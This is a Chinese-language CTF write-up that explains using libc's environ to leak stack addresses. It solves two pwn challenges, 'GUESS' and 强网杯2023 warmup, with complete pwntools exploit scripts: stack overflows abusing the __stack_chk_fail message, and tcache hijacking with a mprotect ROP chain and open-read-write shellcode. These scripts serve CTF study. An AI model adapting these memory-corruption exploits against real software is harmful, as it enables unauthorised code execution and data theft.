#### 前置

environ是libc中一个变量，指向了栈上的一个地址，而栈上这个地址存放了环境变量字符串的指针

即environ是libc与栈的桥梁，当获取environ变量的值时，通过调试，也就可以确定其他栈上变量的地址

#### GUESS

一个利用栈溢出报错来输出flag的题目

##### 前置

报错函数__stack_chk_fail调用了__fortify_fail

```
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
	__fortify_fail ("stack smashing detected");
}
```

__fortify_fail输出了__libc_argv[0]变量

```
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
    /* The loop is added only to keep gcc happy.  */
    while (1)
        __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>");
}
```

而这个变量储存在栈上，覆盖这个地址内容即可输出我们想要的内容

##### 思路

一个三次的栈溢出

第一次溢出使用got表泄露libc基址

第二次溢出使用environ泄露栈基址

第三次溢出将栈上变量覆盖为buf地址获取flag

##### exp

通过调试确定buf与__libc_argv[0]的偏移为0x168

```
from pwn import *

context(log_level='debug',arch='amd64',os='linux')

io = process('/home/kali/Desktop/GUESS')
# io = gdb.debug('/home/kali/Desktop/GUESS')
libc = ELF('/home/kali/pwn/libc/x64/libc-2.23.so')

puts_got = 0x602020
payload = b'a'*0x100 + p64(puts_got)*0x100
io.sendlineafter(b'Please type your guessing flag\n',payload)

libc_base = u64(io.recvuntil(b'\x7f')[-6::].ljust(8,b'\x00')) - libc.sym['puts']
print(hex(libc_base))

environ = libc_base + libc.sym['__environ']
print(hex(environ))

payload = b'a'*0x100 + p64(environ)*0x100
io.sendlineafter(b'Please type your guessing flag\n',payload)
buf = u64(io.recvuntil(b'\x7f')[-6::].ljust(8,b'\x00')) - 0x168

print(hex(buf))

payload = b'a'*0x100 + p64(buf)*0x100
io.sendlineafter(b'Please type your guessing flag\n',payload)

# gdb.attach(io)
io.interactive()
```

#### 强网杯2023-warmup

前边就是堆风水伪造fd与bk指针实现chunk overlap，然后double free劫持tcache_pthread_struct结构体，实现任意内存分配

后边在泄露libc基址后，stdout泄露environ变量，通过调试确定add函数ret的栈地址，用任意内存分配到此处的chunk写一个orw rop

```
delete(4)
delete(9)
delete(10)

for i in range(7):
    add(0x70)
add(0x70, p64((heap_base + 0xf0) ^ (key + 1)))

environ = libc_base + libc.sym['__environ']
stdout = libc_base + libc.sym['_IO_2_1_stdout_']

add(0x70)
add(0x70)
add(0x70, p64(0) + p64(stdout) + p64(0) + p64(heap_base + 0x260))

payload = p64(0x00000000fbad1800) + p64(0)*3 + p64(environ) + p64(environ + 8)
add(0xe0, payload)
print(hex(environ))
stack = u64(io.recvuntil(b'\x7f').ljust(8,b'\x00'))
print(hex(stack))

delete(0)
delete(1)
add(0x100, p64(stack - 0x148))


ret = libc_base + 0x29139
rsi = libc_base + 0x2be51
rdi = libc_base + 0x2a3e5
rdx = libc_base + 0x796a2
mprotect = libc_base + libc.sym['mprotect']

# gdb.attach(io,'b *$rebase(0x18EF)')

pl = p64(0) + p64(rdi) + p64((stack >> 12) << 12) + p64(rsi) + p64(0x3000) + p64(rdx) + p64(7) + p64(mprotect)
pl += p64(stack - 0x100) + asm(shellcraft.open('./zzz') + shellcraft.read(3, stack + 0x1000, 0x50) + shellcraft.write(1, stack + 0x1000, 0x50))
add(0x3b0, pl)


gdb.attach(io,'heap')
io.interactive()
```
